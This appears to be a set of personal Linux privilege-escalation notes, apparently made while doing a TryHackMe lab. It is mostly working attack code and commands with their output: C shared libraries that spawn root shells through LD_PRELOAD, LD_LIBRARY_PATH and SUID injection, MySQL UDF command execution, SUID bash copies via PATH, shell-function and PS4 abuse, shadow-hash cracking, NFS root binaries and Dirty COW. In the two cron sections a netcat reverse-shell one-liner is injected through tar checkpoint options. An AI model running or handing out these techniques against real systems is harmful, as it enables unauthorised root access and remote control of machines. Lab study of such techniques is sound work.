***`Services Exploit`***

[+] Service: Mysql 
[+] Technique: UDF 
[+] Exploit : [MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2) - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/1518)

[+] Steps
-   compile Exploit source code
```bash
gcc -g -c raptor_udf2.c -fPIC  
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

- connect to mysql
```bash
mysql -uroot -p
```

- execute query in mysql  after select database (mysql)
```bash
use mysql;  
create table foo(line blob);  
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));  
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';  
create function do_system returns integer soname 'raptor_udf2.so';
```

- ensure function its create 

```bash
select * from mysql.func

```

- execute shell command through mysql 
```bash
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');`
```



***`Weak File Permissions - Readable /etc/shadow`***

[+] Technique: Brute-Force shadow password
[+] Shadow it's writable/Readable
[+] Link: [Cracking /etc/shadow with John | - erev0s.com](https://erev0s.com/blog/cracking-etcshadow-john/)
[+] Steps

- extract root section from /etc/password and /etc/shadow

**/etc/passwd**

```bash
cat /etc/passwd|grep root
root:x:0:0:root:/root:/bin/bash

```

**/etc/shadow**
```bash
cat /etc/shadow|grep root
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::

```

- use unshadow tool and pass (passwd and shadow)

```bash
unshadow passwd shadow >crack
Created directory: /root/.john

cat crack
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:0:0:root:/root:/bin/bash



```


- use john to crack hash file
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt crack
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)
1g 0:00:00:01 DONE (2022-02-21 14:23) 0.8064g/s 1238p/s 1238c/s 1238C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```



***`Weak File Permissions - Writable /etc/shadow`***

[+] Technique: Edit /etc/shadow file
[+] Shadow it's writable/Readable
[+] Steps

- generate password
```bash
mkpasswd -m sha-512 1234
```

- login as root
```bash
su root
```


***`Weak File Permissions - Writable /etc/passwd`***

[+] Technique: Edit /etc/passwd file
[+] passwd it's writable/Readable
[+] Steps


- generate password using `openssl`

```bash
openssl passwd 1234
```

-  replace generated password in /etc/passwd  (replace x  with generated password)

- login using `su`

```bash
su root
```


***`Sudo - Shell Escape Sequences`***

[+] Technique:  exploit weakness with binary 
[+] Link: [https://gtfobins.github.io](https://gtfobins.github.io/)



***` Sudo - Environment Variables`***

Sudo can be configured to inherit certain environment variables from the user's environment.


- check which env sudo they use


```bash
user@debian:/tmp$ sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=`LD_PRELOAD`, env_keep+=`LD_LIBRARY_PATH`

```

`LD_PRELOAD`: loads a shared object before any others when a program is run
`LD_LIBRARY_PATH`: provides a list of directories where shared libraries are searched for first

[+] setps
- create lib file

*preload.c*

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

```

- compile  preload.c file

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

- run sudo with  any program list to run with sudo

```bash
sudo LD_PRELOAD=/tmp/preload.so less

```


* exploit binary that doest list in gtfobin with sudo env 


[+] steps
- run load library against binary file.

```bash
ldd /usr/sbin/apache2
```

one of shared library it's `libcrypt.so.1`   use code below to create shared library 


*libcrypt.so.1*
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}

```

- compile code 
```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```


- run sudo and put dir where shared library 
```bash
user@debian:/tmp$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
user@debian:/tmp$ sudo LD_LIBRARY_PATH=/tmp apache2
apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/libaprutil-1.so.0)
root@debian:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```


***`Cron Jobs - File Permissions`***

[+] view crons
```bash

user@debian:/tmp$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh

```

[+] exploit tar in cron
[+] Link: [Tar Privilege Escalation – Greg Scharf](https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/)
[Exploiting Wildcard for Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)


```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc IP  PORT >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```



***`Cron Jobs - PATH Environment Variable`***



```bash
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin



```


** * * * * root `overwrite.sh`
** * * * * root /usr/local/bin/compress.sh
*`overwrite.sh`*
```bash
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```




[+]steps
- create bash script on dir that run by cron process and make it executable `chmod +x overwrite.sh `
-  make sure PATH start with user controlled dir where bash script allocate in order to hijack run script like path weakness vulnerability.


```bash
user@debian:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```



```bash
user@debian:~$ /tmp/rootbash
rootbash-4.1$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)

```



***`Cron Jobs - Wildcards`***

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1| nc IP  PORT >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```


[+] exploit tar in cron
[+] Link: [Tar Privilege Escalation – Greg Scharf](https://blog.gregscharf.com/2021/03/22/tar-in-cronjob-to-privilege-escalation/)
[Exploiting Wildcard for Privilege Escalation - Hacking Articles](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)



***`SUID / SGID Executables - Known Exploits`***

[+] Find all SUID/SGID 

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

```

[+] vulnerable: Exim 
[+]Link: [Exim 4.84-3 - Local Privilege Escalation - Linux local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/39535)

```bash
nano /tmp/root.pm

cat /tmp/root.pm
package root;
use strict;
use warnings;

system("/bin/sh");



user@debian:~$ PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps
sh-4.1# id
uid=0(root) gid=1000(user) groups=0(root)

```



***`SUID / SGID Executables - Shared Object Injection`***

shared object could be detect by using strace or ltrace or strings to find loaded binary that doest use absolute path in system api, in some cases you could exploit missing library that binary called during execution.

use strace to monitor binary.

```bash
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
```

`/home/user/.config/libcalc.so` can't find that  library.

[+] exploit steps
- create dir  .config and create `libcalc.so`  library
*`libcalc.so`*
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}

```


- compile `libcalc.so` 

```bash

gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- run binary


```bash
user@debian:~/tools/suid$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = 3


user@debian:~/tools/suid$ /usr/local/bin/suid-so
Calculating something, please wait...
bash-4.1#
bash-4.1# id
uid=0(root) gid=1000(user) egid=50(staff) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1#


```


***` SUID / SGID Executables - Environment Variables`***

[+] technique: path weakness

[+] steps
- run strings  to detect any call for binary files without using absolute path

```bash

user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start

```

`service apache2 star` run service command without absolute path which make it vulnerable to path weakness.


- create  `service` file in /tmp dir.

```bash
user@debian:/tmp$ cat service
#!/bin/bash

/bin/bash
```

- add /tmp as first dir in PATH 

```bash
user@debian:/tmp$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin
user@debian:/tmp$ export PATH=/tmp:$PATH
user@debian:/tmp$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/sbin:/usr/sbin:/usr/local/sbin

```

- run  vulnerable binary

```bash
user@debian:/tmp$ /usr/local/bin/suid-env
root@debian:/tmp#
root@debian:/tmp# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

```




**` SUID / SGID Executables - Abusing Shell Features (#1)`**

[+] bypass absolute path: vulnerability in bash <4.2.048 
[+] technique:  overwrite absolute path  by creating function which name look like absolute path


[+] steps

- run strings to look for 

```bash
user@debian:~$ strings /usr/local/bin/suid-env2
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
/usr/sbin/service apache2 start
```

- check bash version 

```bash
user@debian:~$ /bin/bash --version
GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
```

- create  function and export it  to overwrite real absolute path when binary run.

```bash
user@debian:~$ function /usr/sbin/service { /bin/bash -p; }
user@debian:~$ export -f /usr/sbin/service
```

- run binary

```bash
user@debian:~$ /usr/local/bin/suid-env2
root@debian:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```



**` SUID / SGID Executables - Abusing Shell Features (#2)`**

[+] technique : by exploit debugging environment variable `PS4` 

[+] Steps
- set `PS4` to bash command.

```bash

env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/bash;chmod u+s /tmp/bash)' /usr/local/bin/suid-env2


user@debian:~$ /tmp/bash -p
bash-4.1# id
uid=1000(user) gid=1000(user) euid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)


```




**`Passwords & Keys - History Files`**

looking for sensitive data in `.*history`   

```bash
total 56
drwxr-xr-x 5 user user 4096 May 15  2020 .
drwxr-xr-x 3 root root 4096 May 15  2017 ..
-rw------- 1 user user  410 Feb 22 13:40 .bash_history
-rw-r--r-- 1 user user  220 May 12  2017 .bash_logout
-rw-r--r-- 1 user user 3235 May 14  2017 .bashrc
drwxr-xr-x 2 user user 4096 May 13  2017 .irssi
drwx------ 2 user user 4096 May 15  2020 .john
-rw------- 1 user user  137 May 15  2017 .lesshst
-rw-r--r-- 1 user user  212 May 15  2017 myvpn.ovpn
-rw------- 1 user user   11 May 15  2020 .nano_history
-rw-r--r-- 1 user user  725 May 13  2017 .profile
drwxr-xr-x 8 user user 4096 May 15  2020 tools
-rw------- 1 user user 6334 May 15  2020 .viminfo
user@debian:~$ cat .*history

ls -al
cat .bash_history
ls -al
mysql -h somehost.local -uroot -ppassword123
exit
cd /tmp



```


**`Passwords & Keys - Config Files`**


search for keys in config files which would be config for cms  or server config 

```bash
user@debian:~$ cat myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

user@debian:~$ cat /etc/openvpn/auth.txt
root
password123


```

`/etc/openvpn/auth.txt`  contain root password

**`Passwords & Keys - SSH Keys`**

save backup with incorrect permissions


```bash
user@debian:~$ ls -l /.ssh
total 4
-rw-r--r-- 1 root root 1679 Aug 25  2019 root_key

```



**`NFS`**

[+] Links: [2049 - Pentesting NFS Service - HackTricks](https://book.hacktricks.xyz/pentesting/nfs-service-pentesting)
[NFS no_root_squash/no_all_squash misconfiguration PE - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)

Files created via NFS inherit the **remote** user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

```bash
user@debian:~$ cat /etc/exports

/tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)


```


`no_root_squash`  it's enable which will inherit the remote user ID .


```bash
┌──(root㉿debian)-[~]
└─# mkdir /tmp/nfs

┌──(root㉿debian)-[~]
└─# mount -o rw,vers=2  10.10.215.219:/tmp /tmp/nfs

┌──(root㉿debian)-[/tmp/nfs]
└─# cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}

┌──(root㉿debian)-[/tmp/nfs]
└─# gcc pwn.c -o pwn


┌──(root㉿debian)-[/tmp/nfs]
└─# chmod +xs pwn



#NFS server

user@debian:/tmp$ ./pwn    -p
bash-4.1# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
bash-4.1#


```


**`Kernel Exploits`**

[+] check kernel release date

```bash
user@debian:/tmp$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux

```


`13 May 2014` it's kernel release date which it's vulnerable to kernel exploit 

[+] use searchsploit  to look for kernel exploit

```bash

┌──(root㉿debian)-[/tmp/nfs]
└─# searchsploit  linux kernel 2.6.32-5
------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                         |  Path
------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                              | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                                      | linux/local/50135.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation ( | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/etc/passw | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)           | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/pa | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)            | linux/local/40611.c

```

`Dirty Cow`  affect 2.6.22<3.9  kernel version


or you can use exploit-suggester

```bash
user@debian:/tmp$ perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 2.6.32
  Searching 72 exploits...

  Possible Exploits
  [1] american-sign-language
      CVE-2010-4347
      Source: http://www.securityfocus.com/bid/45408
  [2] can_bcm
      CVE-2010-2959
      Source: http://www.exploit-db.com/exploits/14814
  [3] dirty_cow
      CVE-2016-5195
      Source: http://www.exploit-db.com/exploits/40616
  [4] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [5] half_nelson1
      Alt: econet       CVE-2010-3848
      Source: http://www.exploit-db.com/exploits/17787
  [6] half_nelson2
      Alt: econet       CVE-2010-3850
      Source: http://www.exploit-db.com/exploits/17787
  [7] half_nelson3
      Alt: econet       CVE-2010-4073
      Source: http://www.exploit-db.com/exploits/17787
  [8] msr
      CVE-2013-0268
      Source: http://www.exploit-db.com/exploits/27297
  [9] pktcdvd
      CVE-2010-3437
      Source: http://www.exploit-db.com/exploits/15150
  [10] ptrace_kmod2
      Alt: ia32syscall,robert_you_suck       CVE-2010-3301
      Source: http://www.exploit-db.com/exploits/15023
  [11] rawmodePTY
      CVE-2014-0196
      Source: http://packetstormsecurity.com/files/download/126603/cve-2014-0196-md.c
  [12] rds
      CVE-2010-3904
      Source: http://www.exploit-db.com/exploits/15285
  [13] reiserfs
      CVE-2010-1146
      Source: http://www.exploit-db.com/exploits/12130
  [14] video4linux
      CVE-2010-3081
      Source: http://www.exploit-db.com/exploits/15024
```

- compile exploit

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
```

- run exploit

```bash
user@debian:/tmp$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
user@debian:/tmp$ ./c0w

   (___)
   (o o)_____/
    @@ `     \
     \ ____, //usr/bin/passwd
     //    //
    ^^    ^^
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap 4044d000


madvise 0

ptrace 0

user@debian:/tmp$
user@debian:/tmp$ /usr/bin/passwd
root@debian:/tmp# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)

```




**  Resource **
[TryHackMe | Linux PrivEsc](https://tryhackme.com/room/linuxprivesc)